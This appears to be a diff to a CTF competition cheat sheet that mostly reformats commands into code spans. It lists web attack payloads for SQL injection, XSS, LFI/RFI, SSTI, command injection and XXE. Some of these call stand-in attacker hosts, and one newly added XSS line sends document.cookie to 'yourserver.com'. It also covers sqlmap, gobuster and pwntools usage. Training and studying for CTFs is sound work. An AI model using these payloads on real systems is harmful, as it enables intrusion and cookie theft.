@@ -68,7 +68,7 @@ The first few minutes are crucial for setting the pace and maximizing your score
     - Check robots.txt, sitemap.xml, .well-known/security.txt.
     - Inspect HTTP headers (developer tools -> Network tab). Look for custom headers, cookies, server technologies.
     - Directory/file fuzzing: dirb, gobuster, ffuf.
-        - gobuster dir -u http://&lt;target&gt;/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,bak,old
+        - `gobuster dir -u http://&lt;target&gt;/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,bak,old`
     - Subdomain enumeration (if applicable).
     - Technology stack identification (Wappalyzer extension, whatweb).
 2. **Spider/Crawl:** Use Burp Suite's spider or a manual crawl to map out the application.
@@ -78,37 +78,37 @@ The first few minutes are crucial for setting the pace and maximizing your score
 
 - **SQL Injection (SQLi):**
   - Check all input parameters (GET, POST, HTTP Headers, Cookies).
-  - Manual: ', " , sleep(5)--, OR 1=1--
+  - Manual: `'`, `"` , `sleep(5)--`, `OR 1=1--`
   - Boolean-based, Error-based, Union-based, Time-based, Out-of-band.
-  - Payloads: admin' OR '1'='1 , admin' OR '1'='1'#, admin' OR '1'='1'-- , 1' UNION SELECT null, version()--
-  - Tools: sqlmap -u "http://&lt;target&gt;/vuln.php?id=1" --dbs --batch
+  - Payloads: `admin' OR '1'='1` , `admin' OR '1'='1'#`, `admin' OR '1'='1'-- -`, `1' UNION SELECT null, version()-- -`
+  - Tools: `sqlmap -u "http://&lt;target&gt;/vuln.php?id=1" --dbs --batch`
 - **Cross-Site Scripting (XSS):**
   - Reflected, Stored, DOM-based.
-  - Payloads: &lt;script&gt;alert(1)&lt;/script&gt;, &lt;img src=x onerror=alert(document.cookie)&gt;, &lt;svg onload=alert(1)&gt;
+  - Payloads: `&lt;script&gt;alert(1)&lt;/script&gt;`, `&lt;img src=x onerror=alert(document.cookie)&gt;`, `&lt;svg onload=alert(1)&gt;`, `<script>fetch('https://yourserver.com?cookie='+document.cookie)</script>`
   - Test in all input fields, URL parameters, HTTP headers that might be reflected.
   - Bypass filters: Case variations, encoding (HTML entities, URL encoding), event handlers.
 - **Local File Inclusion (LFI) / Remote File Inclusion (RFI):**
-  - ?file=../../../../etc/passwd, ?page=../../../../windows/win.ini
-  - PHP Wrappers: php://filter/convert.base64-encode/resource=index.php, php://input (with POST data)
-  - Null byte bypass: ../../../../etc/passwd%00 (less common now).
-  - RFI: ?page=<http://attacker.com/shell.txt>
+  - `?file=../../../../etc/passwd`, `?page=../../../../windows/win.ini`
+  - PHP Wrappers: `php://filter/convert.base64-encode/resource=index.php, php://input (with POST data)`
+  - Null byte bypass: `../../../../etc/passwd%00` (less common now).
+  - RFI: `?page=<http://attacker.com/shell.txt>`
 - **Server-Side Template Injection (SSTI):**
   - Identify template engine (e.g., Jinja2, Twig, FreeMarker).
   - Payloads:
-    - Jinja2: {{ 7\*7 }}, {{ config.items() }}, {{ self.\__init_\_._\_globals_\_._\_builtins_\_.open('/etc/passwd').read() }}
-    - FreeMarker: &lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ ex("id") }
+    - Jinja2: `{{ 7\*7 }}`, `{{ config.items() }}`, `{{ self.\__init_\_._\_globals_\_._\_builtins_\_.open('/etc/passwd').read() }}`
+    - FreeMarker: `&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ ex("id") }`
 - **Command Injection:**
-  - | id, ; id, && id, $(id)
-  - ?host=127.0.0.1; ls -la
+  - `| id`, `; id`, `&& id`, `$(id)`
+  - `?host=127.0.0.1; ls -la`
 - **XML External Entity (XXE) Injection:**
-  - &lt;!DOCTYPE foo \[ <!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; \]>&lt;foo&gt;&xxe;&lt;/foo&gt;
-  - &lt;!DOCTYPE foo \[ <!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd"&gt; \]>&lt;foo&gt;&xxe;&lt;/foo&gt;
+  - `&lt;!DOCTYPE foo \[ <!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; \]>&lt;foo&gt;&xxe;&lt;/foo&gt;`
+  - `&lt;!DOCTYPE foo \[ <!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd"&gt; \]>&lt;foo&gt;&xxe;&lt;/foo&gt;`
 - **Insecure Deserialization:**
   - Identify language/framework (Java, PHP, Python, .NET).
   - Generate payloads with tools like ysoserial (Java), PHPGGC (PHP).
 - **Authentication/Authorization Bypass:**
   - Weak passwords, default credentials.
-  - Parameter tampering (e.g., ?user_id=1 to ?user_id=admin_id).
+  - Parameter tampering (e.g., `?user_id=1` to `?user_id=admin_id`).
   - JWT issues (none algorithm, weak secret, signature stripping).
   - IDOR (Insecure Direct Object References).
 - **Directory Traversal:** See LFI.
@@ -118,7 +118,7 @@ The first few minutes are crucial for setting the pace and maximizing your score
   - Magic byte manipulation.
   - Race conditions.
 - **Prototype Pollution (JavaScript):**
-  - ?\__proto_\_\[isAdmin\]=true
+  - `?\__proto_\_\[isAdmin\]=true`
 - **GraphQL Exploitation:**
   - Introspection queries.
   - Batching attacks.
@@ -141,14 +141,14 @@ The first few minutes are crucial for setting the pace and maximizing your score
 
 - **Encoding/Decoding:**
   - CyberChef is invaluable. Try "Magic" recipe.
-  - Python: import base64; base64.b64decode(data)
+  - Python: `import base64; base64.b64decode(data)`
 - **Classical Ciphers:**
   - **Caesar:** Brute-force all 25 shifts.
   - **Vigenere:** Identify key length (Kasiski examination, Friedman test), then frequency analysis per key letter.
   - **Substitution:** Frequency analysis, pattern words.
 - **RSA:**
   - **Small** e **(e.g., 3, 5):** If m^e < n, then m = c^(1/e).
-  - **Factoring** n**:** yafu, factordb.com. If n is small or has common factors.
+  - **Factoring** n **:** yafu, factordb.com. If n is small or has common factors.
   - **Wiener's Attack:** Small private exponent d.
   - **Hastad's Broadcast Attack:** Same message encrypted with same small e under different n.
   - **Common Modulus Attack:** Same n, different e, same message.
@@ -179,9 +179,9 @@ The first few minutes are crucial for setting the pace and maximizing your score
 **Initial Steps:**
 
 1. **File Identification:**
-    - file &lt;filename&gt;
-    - strings &lt;filename&gt; (look for readable text, flags, libraries, error messages).
-    - binwalk &lt;filename&gt; (for firmware, embedded files).
+    - `file &lt;filename&gt;`
+    - `strings &lt;filename&gt;` (look for readable text, flags, libraries, error messages).
+    - `binwalk &lt;filename&gt;` (for firmware, embedded files).
 2. **Basic Static Analysis:**
     - Disassembler/Decompiler (Ghidra, IDA Pro, radare2, Cutter).
     - Look at main function or entry point.
@@ -220,20 +220,20 @@ The first few minutes are crucial for setting the pace and maximizing your score
 
 1. **File Type Identification:** file, TrID.
 2. **Metadata Analysis:** exiftool, mediainfo.
-3. **Strings Extraction:** strings -a -n &lt;min_length&gt; &lt;filename&gt;. Grep for flag{ or common patterns.
+3. **Strings Extraction:** `strings -a -n &lt;min_length&gt; &lt;filename&gt;`. Grep for flag{ or common patterns.
 4. **Integrity Check:** If hashes are provided, verify them.
 
 **Common Tactics & Techniques:**
 
 - **Disk Forensics:**
-  - Mount image: mount -o ro,loop,offset=&lt;offset_bytes&gt; image.dd /mnt/disk (find offset with fdisk -l image.dd or mmls image.dd).
+  - Mount image: `mount -o ro,loop,offset=&lt;offset_bytes&gt; image.dd /mnt/disk` (find offset with fdisk -l image.dd or mmls image.dd).
   - Tools: Autopsy, FTK Imager (Windows), Sleuth Kit (fls, icat).
   - Look for deleted files, file carving, registry analysis (Windows), browser history, event logs.
 - **Memory Forensics:**
   - Volatility Framework.
-  - Identify profile: vol.py -f mem.raw imageinfo
+  - Identify profile: `vol.py -f mem.raw imageinfo`
   - Common plugins: pslist, pstree, netscan, cmdscan, procdump, memdump, filescan, hashdump, mimikatz (for credentials).
-  - vol.py -f mem.raw --profile=&lt;Profile&gt; &lt;plugin&gt;
+  - v`ol.py -f mem.raw --profile=&lt;Profile&gt; &lt;plugin&gt;`
 - **Network Forensics (PCAP Analysis):**
   - Wireshark:
     - Display filters (e.g., ip.addr == x.x.x.x, tcp.port == 80, http.request).
@@ -303,17 +303,19 @@ The first few minutes are crucial for setting the pace and maximizing your score
   - **RELRO (Relocation Read-Only):** Full RELRO makes GOT overwrite harder. Partial RELRO still allows some GOT overwrites.
 - **Pwntools (Python library):** Essential for scripting exploits.
 
+```python
 from pwn import \*
 
-\# p = process('./vuln_binary')
+# p = process('./vuln_binary')
 
 p = remote('target.com', 1337)
 
-\# payload = b'A'\*offset + p64(canary) + b'B'\*8 + p64(rop_gadget_addr) ...
+# payload = b'A'\*offset + p64(canary) + b'B'\*8 + p64(rop_gadget_addr) ...
 
-\# p.sendline(payload)
+# p.sendline(payload)
 
-\# p.interactive()
+# p.interactive()
+```
 
 #### **F. OSINT (Open Source Intelligence)**
 
@@ -391,7 +393,7 @@ This category is a catch-all. Challenges can be anything.
 
 - **CyberChef:** The "Cyber Swiss Army Knife" for encoding, decoding, encryption, compression, data analysis. (Web-based, can be self-hosted).
 - **Note-Taking App:** Obsidian, CherryTree, Joplin, OneNote. Essential for organizing findings.
-- **Python 3 with** pwntools**,** requests**,** beautifulsoup4**:** For scripting, web interaction, exploit development.
+- **Python 3** with **pwntools**, **requests**, **beautifulsoup4:** For scripting, web interaction, exploit development.
 - **Linux Distro:** Kali Linux, Parrot OS (come pre-loaded with many tools).
 - **Virtual Machine:** VirtualBox, VMware (for isolating risky tools/binaries).
 - **Text Editor:** VS Code, Sublime Text, vim/nano.
